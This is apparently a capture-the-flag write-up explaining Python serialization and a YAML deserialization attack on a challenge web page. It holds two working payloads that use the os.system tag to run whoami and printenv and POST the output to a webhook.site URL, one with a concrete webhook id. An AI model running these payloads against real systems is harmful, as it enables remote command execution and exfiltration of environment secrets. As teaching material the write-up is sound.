# PYTHON DESERILAZATION
Serialization in Python refers to the process of converting a Python object into a format that can be easily stored or transmitted. This format is typically a string or a byte stream. Deserialization, on the other hand, is the process of converting the serialized data back into a Python object.

Serialization allows you to save the state of an object and recreate it later or send it over a network. It is useful for tasks like saving data to a file, transferring data between different systems, or storing data in a database.

Python provides built-in modules like pickle, json, and yaml to perform serialization and deserialization. These modules handle the conversion process automatically, allowing you to easily save and restore the state of objects.

By using serialization, you can persist data, transfer it across different platforms or systems, and reconstruct it as needed, making it a valuable tool in various applications.

Shortly the system will convert the input from object become the format that can be transmitted. Hence the system will execute it. 

So the purpose of this attack is to execute os command such as id, whoami and etc using python deserialization. 

    ![image](https://github.com/aminnazri00/AturKreatif-2023/assets/72528347/f8890797-5d2b-4bde-95a1-289d653628f7)


1. Open page
2. Insert input using yaml format

      ![image](https://github.com/aminnazri00/AturKreatif-2023/assets/72528347/1518a928-3a9f-42fd-9466-d484a9db802e)

3. The system convert yaml format into json

      ![image](https://github.com/aminnazri00/AturKreatif-2023/assets/72528347/0df3e047-c654-44d6-a3eb-f90332a8adda)


```
!!python/object/apply:os.system ["whoami | curl -X POST -d @- https://webhook.site/<your-web-hook-id>"]
```

> The os.system function in Python is used to execute shell commands. It takes a command string as an argument and runs it in a subshell. The os.system function is part of the Python os module, which provides a way to interact with the operating system.

> In the provided YAML representation, the os.system function is being invoked with a single argument, which is a list containing the command string "whoami | curl -X POST -d @- https://webhook.site/<your-web-hook-id>". This command string combines the whoami command, which retrieves the current username, with a curl command that performs an HTTP POST request to the specified URL, sending the output of whoami as the request payload.

> In summary, the YAML representation you provided is instructing the creation of a Python object using the os.system function, which will execute the specified shell command when invoked.

6. The question mention that the flag is located inside the environment variable
```
  !!python/object/apply:os.system ["printenv  | curl -X POST -d @- https://webhook.site/9a324546-0842-4505-9f66-99f8e60e0ed2"]
```
  
![image](https://github.com/aminnazri00/AturKreatif-2023/assets/72528347/ce0c82a0-66ff-48b7-b72f-24dca2f17e78)
